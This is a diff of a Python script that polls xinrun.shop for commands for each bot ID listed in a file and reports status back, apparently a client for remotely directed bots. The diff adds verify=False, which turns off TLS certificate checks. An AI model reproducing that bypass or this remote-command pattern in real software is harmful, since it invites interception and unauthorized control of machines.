@@ -4,7 +4,7 @@ import subprocess, time
 def get_command(bot_id, command_name):
     url = 'https://xinrun.shop/get_command/'
     data = {'bot_id':bot_id, 'command':command_name}
-    response = requests.get(url=url, params=data).json()
+    response = requests.post(url=url, data=data, verify=False).json()
     spec_command = response['spec_command']
     source = response['source']
     return spec_command, source
@@ -12,7 +12,7 @@ def get_command(bot_id, command_name):
 def upload_status(source, bot_id, status):
     url = 'https://xinrun.shop/upload_status/'
     data = {'bot_id': bot_id, 'status': status, 'source':source}
-    requests.get(url=url, params=data)
+    requests.post(url=url, data=data, verify=False)
 
 if __name__ == '__main__':
     """
@@ -25,7 +25,7 @@ if __name__ == '__main__':
     """
     while True:
         bot_id_list = []
-        with open('/root/BotId.txt', 'r', encoding='utf - 8') as file:
+        with open('BotId.txt', 'r', encoding='utf - 8') as file:
             lines = file.readlines()
             for line in lines:
                 bot_id = line.strip()
@@ -38,3 +38,5 @@ if __name__ == '__main__':
             upload_status(source, bot_id, status)
             time.sleep(5)
         time.sleep(60)
+
+
